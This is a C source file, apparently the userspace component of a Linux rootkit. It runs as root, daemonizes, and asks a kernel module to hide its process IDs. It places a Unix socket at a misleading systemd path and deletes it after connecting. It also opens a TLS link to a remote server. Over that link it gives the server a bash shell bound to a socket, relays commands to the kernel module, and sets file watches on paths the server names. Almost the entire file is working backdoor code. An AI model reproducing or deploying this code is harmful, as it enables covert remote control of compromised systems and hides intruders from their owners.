/*
 * Author and Designer: John Agapeyev
 * Date: 2018-10-19
 * Notes:
 * The socket handling for userspace
 */

//Needed for NAME_MAX constant
#define _POSIX_C_SOURCE 200809L

#include <asm/types.h>
#include <assert.h>
#include <limits.h>
#include <linux/tcp.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/fcntl.h>
#include <sys/inotify.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <unistd.h>

#include "crypto.h"
#include "shared.h"

#ifndef UNIX_SOCK_PATH
#define UNIX_SOCK_PATH ("/run/systemd/system/stdout")
#endif

int conn_sock;

/*
 * function:
 *    wrapped_fork
 *
 * return:
 *    pid_t
 *
 * parameters:
 *    void
 *
 * notes:
 * Simple wrapper around fork call
 */
pid_t wrapped_fork(void) {
    pid_t pid;
    if ((pid = fork()) == -1) {
        perror("fork()");
        exit(EXIT_FAILURE);
    }
    return pid;
}

void hide_proc(void) {
    unsigned char buffer[30];
    memset(buffer, 0, 30);
    sprintf((char*) buffer, "hide %d", getpid());
    printf("Writing %s to module on process start\n", buffer);
    write(conn_sock, buffer, strlen((char*) buffer));
}

/*
 * function:
 *    run_remote_shell
 *
 * return:
 *    void
 *
 * parameters:
 *    void
 *
 * notes:
 * Connects to unix socket, and establishes it as input for standard streams before execing bash
 */
void run_remote_shell(void) {
    int remote_sock = socket(AF_UNIX, SOCK_STREAM, 0);

    struct sockaddr_un su;
    memset(&su, 0, sizeof(struct sockaddr_un));
    su.sun_family = AF_UNIX;
    strcpy(su.sun_path, SHELL_SOCK_PATH);

    errno = 0;

    if (connect(remote_sock, (struct sockaddr*) &su, sizeof(struct sockaddr_un))) {
        perror("connect");
        printf("%d\n", errno);
        exit(EXIT_FAILURE);
    }
    printf("connect %d\n", remote_sock);

    printf("shell running\n");

    if (wrapped_fork()) {
        exit(EXIT_SUCCESS);
    }
    setsid();

    sleep(1);

    hide_proc();

    dup2(remote_sock, 0);
    dup2(remote_sock, 1);
    dup2(remote_sock, 2);

    printf("Shell PID: %d\n", getpid());

    const char* sh[2];
    sh[0] = "/bin/bash";
    sh[1] = NULL;

    execve(sh[0], (char* const*) sh, 0);
}

/*
 * function:
 *    create_unix_socket
 *
 * return:
 *    int
 *
 * parameters:
 *    const char* sock_path
 *
 * notes:
 * Creates a unix socket based on a path
 */
int create_unix_socket(const char* sock_path) {
    int local_tls_socket = socket(AF_UNIX, SOCK_STREAM, 0);

    struct sockaddr_un su;
    memset(&su, 0, sizeof(struct sockaddr_un));
    su.sun_family = AF_UNIX;
    strcpy(su.sun_path, sock_path);

    unlink(sock_path);
    if (bind(local_tls_socket, (struct sockaddr*) &su, sizeof(struct sockaddr_un)) == -1) {
        perror("bind");
        return EXIT_FAILURE;
    }
    return local_tls_socket;
}

/*
 * function:
 *    create_remote_socket
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Creates a remote socket and connects it to the server
 */
int create_remote_socket(void) {
    int remote_sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in sin;
    sin.sin_addr.s_addr = SERVER_IP;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);

    if (connect(remote_sock, (struct sockaddr*) &sin, sizeof(struct sockaddr_in))) {
        perror("connect");
        return EXIT_FAILURE;
    }
    return remote_sock;
}

/*
 * function:
 *    create_epoll_fd
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Wrapper around epoll_create1()
 */
int create_epoll_fd(void) {
    int efd;
    if ((efd = epoll_create1(0)) == -1) {
        perror("epoll_create1");
        exit(EXIT_FAILURE);
    }
    return efd;
}

/*
 * function:
 *    add_epoll_socket
 *
 * return:
 *    void
 *
 * parameters:
 *    const int epollfd
 *    const int sock
 *    struct epoll_event* ev
 *
 * notes:
 * Wrapper around epoll_ctl
 */
void add_epoll_socket(const int epollfd, const int sock, struct epoll_event* ev) {
    if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, ev) == -1) {
        perror("epoll_ctl");
        exit(EXIT_FAILURE);
    }
}

/*
 * function:
 *    wait_for_epoll_event
 *
 * return:
 *    int
 *
 * parameters:
 *    const int epollfd
 *    struct epoll_event* events
 *
 * notes:
 * Wrapper around epoll_wait
 */
int wait_for_epoll_event(const int epollfd, struct epoll_event* events) {
    int nevents;
    if ((nevents = epoll_wait(epollfd, events, 100, -1)) == -1) {
        if (errno == EINTR) {
            //Interrupted by signal, ignore it
            return 0;
        }
        perror("epoll_wait");
        exit(EXIT_FAILURE);
    }
    return nevents;
}

int create_inotify_descriptor(void) {
    int fd = inotify_init1(IN_NONBLOCK | IN_CLOEXEC);
    if (fd < 0) {
        perror("inotify_init1");
        exit(EXIT_FAILURE);
    }
    return fd;
}

/*
 * function:
 *    main
 *
 * return:
 *    int
 *
 * parameters:
 *    int argc
 *    char** argv
 *
 * notes:
 * Establishes a TLS session, forks into read and write processes, and forwards packets
 */
int main(void) {
    if (setuid(0)) {
        perror("setuid");
        exit(EXIT_FAILURE);
    }
    if (setgid(0)) {
        perror("setgid");
        exit(EXIT_FAILURE);
    }

    //Daemonize
    if (wrapped_fork()) {
        return EXIT_SUCCESS;
    }
    setsid();

    init_openssl();
    SSL_CTX* ctx = create_context();
    configure_context(ctx);

    int local_tls_socket = create_unix_socket(UNIX_SOCK_PATH);
    int remote_shell_unix = create_unix_socket(SHELL_SOCK_PATH);

    listen(local_tls_socket, 5);
    listen(remote_shell_unix, 5);

    //int conn_sock = accept(local_tls_socket, NULL, 0);
    conn_sock = accept(local_tls_socket, NULL, 0);
    fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK);

    //Close after the unix socket accepts the connection
    close(local_tls_socket);

    int remote_sock = create_remote_socket();

    int inot_fd = create_inotify_descriptor();
    int inot_epoll = create_epoll_fd();
    int inot_wds[8192];
    size_t inot_watch_count = 0;

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, remote_sock);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
        return EXIT_FAILURE;
    }

    unsigned char buffer[MAX_PAYLOAD];
    int remote_shell_sock = -1;

    if (!wrapped_fork()) {
        run_remote_shell();
    } else {
        if (wrapped_fork()) {
            return EXIT_SUCCESS;
        }
        setsid();
        remote_shell_sock = accept(remote_shell_unix, NULL, 0);
        fcntl(remote_shell_sock, F_SETFL, fcntl(remote_shell_sock, F_GETFL, 0) | O_NONBLOCK);

        close(remote_shell_unix);

        printf("accept %d\n", remote_shell_sock);
    }

    if (wrapped_fork()) {
        return EXIT_SUCCESS;
    }
    setsid();
    if (!wrapped_fork()) {
        if (wrapped_fork()) {
            return EXIT_SUCCESS;
        }
        setsid();

        int efd = create_epoll_fd();
        struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));

        struct epoll_event ev;
        ev.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
        ev.data.fd = conn_sock;
        add_epoll_socket(efd, conn_sock, &ev);
        struct epoll_event eve;
        eve.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
        eve.data.fd = remote_shell_sock;
        add_epoll_socket(efd, remote_shell_sock, &eve);

        //sleep(3);

        hide_proc();

        for (;;) {
            int n = wait_for_epoll_event(efd, eventList);
            //n can't be -1 because the handling for that is done in wait_for_epoll_event
            assert(n != -1);
            for (int i = 0; i < n; ++i) {
                if (eventList[i].events & EPOLLERR || eventList[i].events & EPOLLHUP) {
                    fprintf(stderr, "Sock error\n");
                    close(eventList[i].data.fd);
                } else if (eventList[i].events & EPOLLIN) {
                    int size;
                    while ((size = read(eventList[i].data.fd, buffer, MAX_PAYLOAD)) > 0) {
                        printf("Read %d bytes\n", size);
                        printf("Wrote %d bytes to server\n", size);
                        SSL_write(ssl, buffer, size);
                    }
                    if (size == 0) {
                        goto done;
                    }
                    if (size == -1) {
                        if (errno != EAGAIN) {
                            perror("read");
                            goto done;
                        }
                    }
                }
            }
        }
    done:
        free(eventList);
    } else {
        setsid();

        //See if I can remove unix socket files after connection
        unlink(UNIX_SOCK_PATH);

        if (wrapped_fork()) {
            setsid();
            hide_proc();

            //Read
            for (;;) {
                int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
                printf("Read %d from server\n", size);
                if (size < 0) {
                    perror("SSL_read");
                    break;
                } else if (size == 0) {
                    break;
                }
                if (buffer[0] == '!') {
                    if (size >= 7 && strncmp("watch", (char*) (buffer + 1), 5) == 0) {
                        //Register inotify handle here

                        //Clear newline character from path
                        buffer[strlen((char *) buffer) - 1] = '\0';
                        int wd;
                        if ((wd = inotify_add_watch(
                                     inot_fd, (char*) (buffer + 7), IN_CREATE | IN_MODIFY))
                                < 0) {
                            perror("inotify_add_watch");
                            exit(EXIT_FAILURE);
                        }
                        //Save watch descriptor
                        inot_wds[inot_watch_count++] = wd;
#if 0
                    } else if (strncmp("unwatch", (char*) (buffer + 1), 7) == 0) {
                        //Unregister all inotify handles here
                        for (size_t i = 0; i < inot_watch_count; ++i) {
                            inotify_rm_watch(inot_fd, inot_wds[i]);
                        }
#endif
                    } else {
                        printf("Wrote %d to kernel module\n", size);
                        write(conn_sock, buffer + 1, size - 1);
                    }
                } else {
                    printf("Wrote %d to remote shell\n", size);
                    //Pass message to shell process
                    write(remote_shell_sock, buffer, size);
                }
                memset(buffer, 0, MAX_PAYLOAD);
            }
        } else {
            setsid();
            hide_proc();

            //Handle inotify stuffs here
            struct epoll_event ev;
            ev.data.fd = inot_fd;
            ev.events = EPOLLIN | EPOLLET;

            add_epoll_socket(inot_epoll, inot_fd, &ev);

            struct epoll_event* event_list = calloc(100, sizeof(struct epoll_event));

            unsigned char buf[sizeof(struct inotify_event) + NAME_MAX + 1];
            struct inotify_event* ie = (struct inotify_event*) buf;

            for (;;) {
                int n = wait_for_epoll_event(inot_epoll, event_list);
                printf("epoll returned %d\n", n);
                for (int i = 0; i < n; ++i) {
                    int s;
                empty_inotify:
                    s = read(inot_fd, buf, sizeof(buf));
                    printf("inotify returned %d\n", s);
                    if (s < 0 && errno != EAGAIN) {
                        perror("inotify_epoll_read");
                        exit(EXIT_FAILURE);
                    }
                    if (errno == EAGAIN) {
                        break;
                    }
                    printf("inotify mask %d\n", ie->mask);
                    printf("create mask %d\n", IN_CREATE);
                    printf("modify mask %d\n", IN_MODIFY);
                    printf("ignore mask %d\n", IN_IGNORED);
                    //handle updated log file
                    if (ie->mask & IN_MODIFY) {
                        printf("%s was modified\n", ie->name);
                    } else if (ie->mask & IN_CREATE) {
                        printf("%s was created\n", ie->name);
                    }
                    memset(buffer, 0, sizeof(struct inotify_event) + NAME_MAX + 1);
                    goto empty_inotify;
                }
            }

            free(event_list);
        }
    }

    puts("Userspace process exited\n");
    close(conn_sock);
    close(remote_shell_sock);

    close(local_tls_socket);
    close(remote_shell_unix);

    close(inot_fd);
    close(inot_epoll);

    unlink(UNIX_SOCK_PATH);

    SSL_free(ssl);

    close(remote_sock);

    SSL_CTX_free(ctx);

    cleanup_openssl();

    return EXIT_SUCCESS;
}
